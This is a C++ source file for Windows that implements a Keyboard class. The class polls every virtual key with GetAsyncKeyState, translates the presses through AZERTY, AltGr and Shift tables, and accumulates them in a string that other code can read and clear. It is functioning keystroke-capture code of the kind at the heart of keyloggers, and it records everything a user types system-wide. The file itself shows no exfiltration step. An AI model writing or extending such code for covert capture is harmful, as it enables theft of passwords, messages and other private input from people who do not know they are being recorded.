#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0500

#include <Windows.h>
#include "Keyboard.hpp"

Keyboard::Keyboard() : Device("Keyboard", KEYBOARD)
{
	std::cout << "Keyboard created" << std::endl;
	this->_typedKey = "";
	this->_invisibleKey = {
			{VK_DELETE, "*DELETE*"},
			{ VK_BACK, "*BACK*" },
			{ VK_LEFT, "*LEFT*" },
			{ VK_RIGHT, "*RIGHT*" },
			{ VK_UP, "*UP*" },
			{ VK_DOWN, "*DOWN*" },
			{ VK_SHIFT, "*SHIFT*" },
			{ VK_END, "*END*" },
			{ VK_INSERT, "*INSERT*" },
			{ VK_LCONTROL, "*LCONTROL*" },
			{ VK_RCONTROL, "*RCONTROL*" },
			{ VK_SPACE, "*SPACE*" },
			{ VK_CANCEL, "*CANCEL*" },
			{ VK_TAB, "*TAB*" },
			{ VK_CLEAR, "*CLEAR*" },
			{ VK_RETURN, "*RETURN*" },
			{ VK_CAPITAL, "*CAPITAL*" },
			{ VK_F1, "*F1*" },
			{ VK_F2, "*F2*" },
			{ VK_F3, "*F3*" },
			{ VK_F4, "*F4*" },
			{ VK_F5, "*F5*" },
			{ VK_F6, "*F6*" },
			{ VK_F7, "*F7*" },
			{ VK_F8, "*F8*" },
			{ VK_F9, "*F9*" },
			{ VK_F10, "*F10*" },
			{ VK_F11, "*F11*" },
			{ VK_F12, "*F12*" },
			{ 18, "*ALT*" },
	};
	this->_normalKey = {
			{ 0xBE, ";" },
			{ 0xBF, ":" },
			{ 0xDF, "!" },
			{ 0xBB, "=" },
			{ 0xBC, "," },
			{ 0xDC, "*" },
			{ 0xC0, "ù" },
			{ 0xDD, "^" },
			{ 0xDB, ")" },
			{ 0xBA, "$" },
			{ '1', "&" },
			{ '2', "é" },
			{ '3', "\"" },
			{ '4', "'" },
			{ '5', "(" },
			{ '6', "-" },
			{ '7', "è" },
			{ '8', "_" },
			{ '9', "ç" },
			{ '0', "à" },
	};
	this->_altGrKey = {
			{ '2', "~" },
			{ '3', "#" },
			{ '4', "{" },
			{ '5', "[" },
			{ '6', "|" },
			{ '7', "`" },
			{ '8', "\\" },
			{ '9', "^" },
			{ '0', "@" },
			{ 0xDB, "]" },
			{ 0xBA, "¤" },
			{ 0xBB, "}" },
	};
	this->_upperKey = {
			{ '1', "1" },
			{ '2', "2" },
			{ '3', "3" },
			{ '4', "4" },
			{ '5', "5" },
			{ '6', "6" },
			{ '7', "7" },
			{ '8', "8" },
			{ '9', "9" },
			{ '0', "0" },
			{ 0xBE, "." },
			{ 0xBF, "/" },
			{ 0xDF, "§" },
			{ 0xBB, "+" },
			{ 0xBC, "?" },
			{ 0xDC, "µ" },
			{ 0xC0, "%" },
			{ 0xDD, "¨" },
			{ 0xDB, "°" },
			{ 0xBA, "£" },
	};
}

Keyboard::~Keyboard()
{
}

void Keyboard::checkNormalInput(int key)
{
	if (GetKeyState(VK_CAPITAL) | GetAsyncKeyState(VK_SHIFT) && this->_upperKey[key])
		concatTypedKey(this->_upperKey[key]);
	else if (key > 64 && key < 91)
		(GetKeyState(VK_CAPITAL) | GetAsyncKeyState(VK_SHIFT)) ? concatTypedKey(key) : concatTypedKey(key + 32);
	else
		captureOtherChar(key);
}

void Keyboard::captureOtherChar(int key)
{
	if (this->_normalKey[key])
		concatTypedKey(this->_normalKey[key]);
}

void Keyboard::captureAltChar(int key)
{
	if (this->_altGrKey[key])
		concatTypedKey(this->_altGrKey[key]);
}

void Keyboard::captureKey()
{
	int key = 0;

	for (key = 0; key <= 255; key++)
	{
		if (GetAsyncKeyState(key) == -32767)
		{
			if (this->_invisibleKey[key])
				concatTypedKey(this->_invisibleKey[key]);
			else if (GetKeyState(18) & GetAsyncKeyState(VK_LCONTROL))
				captureAltChar(key);
			else
				checkNormalInput(key);
		}
	}
}

void Keyboard::concatTypedKey(const std::string& addKey)
{
	this->_typedKey += addKey;
}

void Keyboard::concatTypedKey(int addKey)
{
	this->_typedKey += addKey;
}

void Keyboard::refreshTypedKey(void)
{
	this->_typedKey.clear();
}

const std::string & Keyboard::getKey() const
{
	return (this->_typedKey);
}